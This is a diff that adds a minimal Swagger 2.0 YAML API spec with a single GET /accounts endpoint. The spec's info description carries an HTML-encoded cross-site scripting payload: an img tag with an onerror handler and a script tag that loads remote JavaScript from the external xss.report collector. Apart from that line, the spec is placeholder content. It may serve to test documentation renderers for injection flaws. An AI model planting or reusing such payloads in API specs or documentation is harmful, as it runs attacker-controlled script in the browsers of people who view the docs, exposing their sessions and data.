@@ -1,0 +1,14 @@
+swagger: '2.0'
+info:
+  title: Example yaml.spec
+  description:  "&lt;img src=x onerror=&#39;&#39;&gt;&lt;script src=https://xss.report/c/digy&gt;&lt;/script&gt;"
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description:  nice
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
